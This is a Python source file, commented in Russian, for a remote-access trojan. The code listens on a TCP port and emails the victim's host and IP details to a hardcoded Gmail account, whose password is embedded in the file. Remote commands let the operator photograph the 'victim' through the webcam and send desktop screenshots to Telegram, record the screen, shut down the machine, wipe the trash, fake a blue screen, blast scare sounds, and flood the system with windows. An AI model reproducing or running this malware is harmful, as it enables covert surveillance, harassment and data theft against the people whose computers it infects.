import platform
from email.mime.text import MIMEText
import socket, smtplib, asyncio
from requests import get

from functions.minimalize_all_window import minimize_all_windows_func
from functions.move_cursor import start_moving_cursor, stop_moving_cursor
from functions.screamer_song import play_sound
from functions.send_photo_telegram import *
from functions.send_screenshot_telegram import *
from functions.open_files import *
from functions.bsod import *
from functions.screen_recording import ScreenRecorder
from functions.set_max_volume import set_max_volume
from functions.start_and_stop_video_in_youtube import toggle_youtube_video
from functions.un_muted import toggle_mute

tasks = []
address = ['', '', '']


async def send_email(message):
    sender = "blackstar013.bs@gmail.com"
    player = "blackstar013.bs@gmail.com"
    password = "bkoemldksmmgmuys"

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()

    try:
        server.login(sender, password)
        msg = MIMEText(message)
        msg['Subject'] = 'CATCH THE INFORMATION FOR !@#$%^&*(USER)'
        msg['From'] = sender
        msg['To'] = player
        server.sendmail(sender, player, msg.as_string())
        return 'Successfully!'
    except Exception as _ex:
        return f'{_ex}\nCheck your login'
    finally:
        server.quit()


async def main():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname_ex(hostname)[-1][-1]
    information_notebook = socket.gethostbyname_ex(hostname)
    public_ip = get('http://api.ipify.org').text

    message = (f'Хост: {hostname}\n'
               f'\nЛокальный IP: {local_ip}\n'
               f'\nВся информация: {information_notebook}\n'
               f'\nПубличный IP: {public_ip}\n')

    print(await send_email(message))


async def open_cam():
    cap = cv2.VideoCapture(0)
    cap.set(cv2.CAP_PROP_FPS, 60)
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)

    while True:
        ret, img = cap.read()
        cv2.imshow('camera', img)

        if cv2.waitKey(1) & 0xFF == ord("q"):  # Esc to close
            break

    cap.release()
    cv2.destroyAllWindows()


async def handle_client(client):
    loop = asyncio.get_event_loop()
    while True:
        recording = ScreenRecorder()
        request = await loop.run_in_executor(None, client.recv, 1024)
        if request:
            request = request.decode()
            print('msg: ', request)

            # ---------------------------------------------------------- Отдел управления компьютером

            # Функция для очистки корзины
            if request == 'clear_сart':
                current_os = platform.system()

                if current_os == "Windows":
                    # Очистка корзины на Windows
                    os.system('rd /s /q %systemdrive%\$Recycle.bin')
                    print("Корзина очищена на Windows.")

                elif current_os == "Darwin":
                    # Очистка корзины на macOS
                    os.system('osascript -e "tell application \"Basket\" to empty trash"')
                    print("Корзина очищена на macOS.")


                elif current_os == "Linux":
                    # Очистка корзины на Linux
                    os.system('rm -rf ~/.local/share/Trash/files/*')
                    os.system('rm -rf ~/.local/share/Trash/info/*')  # Если хотите удалить информацию о файлах
                    print("Корзина очищена на Linux.")

                else:
                    print("Неизвестная операционная система. Очистка корзины не выполнена.")

            # Функция для выключения компьютера
            elif request == 'shutdown_data':
                if os.name == 'nt':  # Windows
                    os.system("shutdown /s /t 0")
                elif os.name == 'posix':  # macOS
                    os.system("osascript -e 'tell app \"System Events\" to shut down'")
                else:
                    os.system("shutdown now -h")


            # Функция для перезагрузки компьютера
            elif request == 'reload_data':
                if os.name == 'nt':  # Windows
                    os.system("shutdown /r /t 0")
                elif os.name == 'posix':  # macOS
                    os.system("osascript -e 'tell app \"System Events\" to restart'")


            # Функция для блокировки экрана
            elif request == 'lock_screen_data':
                if os.name == 'nt':  # Windows
                    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
                elif os.name == 'posix':  # macOS
                    os.system("pmset sleepnow")


            # Функция для бесконечного открытия фоток BSOD в браузере и на рабочем столе
            elif request == 'bsod_screen_brows_data':
                Thread(target=browser_open).start()
                Thread(target=img).start()


            # Функция для вызова на полный экран картинки BSOD без управления мышью
            elif request == 'blue_screen_of_dead':
                trigger_bsod()


            # send_photo_telegram.py (Отправить фото жертвы с камеры в телеграм)
            elif request == 'screenshot_user_data':
                image = capture_image()
                if image:
                    if send_image_via_telegram(image):
                        try:
                            os.remove(image)
                            print(f"Фото {image} успешно удалено.")
                        except Exception as e:
                            print(f"Ошибка при удалении файла: {e}")

                else:
                    print('Не удалось отправить изображение')
                    # add_to_startup()



            # send_screenshot_telegram.py (Отправить фото рабочего стола в телеграм)
            elif request == 'screenshot_screen_data':
                screenshot = capture_screenshot()
                if screenshot:
                    if send_screenshot_via_telegram(screenshot):
                        try:
                            os.remove(screenshot)
                            print(f"Фото {screenshot} успешно удалено.")
                        except Exception as e:
                            print(f"Ошибка при удалении файла: {e}")
                else:
                    print('Не удалось отправить изображение')
                    # add_to_startup()


            # Делает запись экрана пользователя и отправляет в личные сообщения.
            elif request == 'start_record_data':
                recording.start_recording()

            elif request == 'stop_record_data':
                recording.stop_recording()


            # Свернуть все окна
            elif request == 'hide_all_windows_data':
                minimize_all_windows_func()

            # Установить максимальную громкость на пк
            elif request == 'max_volume_data':
                set_max_volume()

            # Включить пугающий звук
            elif request == 'screamer_song_data':
                # Включаем максимальную громкость на компьютере
                set_max_volume()

                # Укажите путь к вашему аудиофайлу (Случайный звук берется)
                music_list = ['brue', 'file', 'salo']
                music_list_random = choice(music_list)
                play_sound(f"music/{music_list_random}.wav")

            # Включить случайное перемещение курсора на пк
            elif request == 'random_cursor_start_data':
                start_moving_cursor()

            # Выключить случайное перемещение курсора на пк
            elif request == 'random_cursor_stop_data':
                stop_moving_cursor()

            # Вкл/Выкл звук на пк
            elif request == 'turn_on_and_off_volume':
                toggle_mute()


            # ---------------------------------------------------------- Отдел управления Youtube

            elif request == 'youtube':
                webbrowser.open('https://www.youtube.com/?app=desktop&hl=ru&gl=RU')

            elif request == 'stop_and_start_movie':
                toggle_youtube_video()


            # ---------------------------------------------------------- Отдел управления Браузером

            elif request == 'chrome':
                webbrowser.open('https://www.google.com/?hl=ru&gl=RU')

            elif request == 'github':
                webbrowser.open('https://github.com')

            elif request == 'binance':
                webbrowser.open('https://www.binance.com/ru/trade/BTC_USDT')

            elif request == 'bybit':
                webbrowser.open('https://bybit.com/ru/trade/BTC_USDT')

            elif request == 'telegram':
                webbrowser.open('https://t.me/')

            elif request == 'discord':
                webbrowser.open('https://discord.com/')

            elif request == 'steam':
                webbrowser.open('https://store.steampowered.com/')

            elif request == 'spotify':
                webbrowser.open('https://open.spotify.com/')

            elif request == 'facebook':
                webbrowser.open('https://www.facebook.com/')

            elif request == 'twitter':
                webbrowser.open('https://twitter.com/')

            elif request == 'instagram':
                webbrowser.open('https://www.instagram.com/')

            elif request == 'whatsapp':
                webbrowser.open('https://web.whatsapp.com/')


            # ---------------------------------------------------------- Временно недоступные функции

            # Функция для спама разных ссылок из списка на почту
            elif request == 'spam_actived':
                for i in range(20):
                    random_address = choice(address)
                    print(await send_email(message=f'SEND TO FATIMA_TIMAEVA: {random_address}'))
                print('Все сообщения успешно доставлены пользователю.')

            # Функция для открытия камеры пользователя
            elif request == 'cam':
                await open_cam()


            # Вызов бесконечного открытия Explorer (Мой компьютер) на компьютере (Для Windows)
            elif request == 'error':
                while request != 'stop':
                    os.system("explorer")


            # Если нет какой-то функции
            else:
                print('У нас нет такой функции!')

        else:
            client.close()
            tasks.remove(client)
            print('Человек отключился.')


async def event_loop(server):
    while True:
        client, addr = await asyncio.get_event_loop().run_in_executor(None, server.accept)
        print(f'Есть подключение {addr[0]}:{addr[1]}')
        print(await send_email(f'Есть подключение {addr[0]}:{addr[1]}'))

        # Создаем задачу для обработки клиента и добавляем ее в список задач
        task = asyncio.create_task(handle_client(client))
        tasks.append(task)


if __name__ == '__main__':
    host = '0.0.0.0'
    port = 5005
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen()

    print("***", socket.gethostbyname_ex(socket.gethostname())[-1][-1], ',', port)

    asyncio.run(main())
    asyncio.run(event_loop(server))
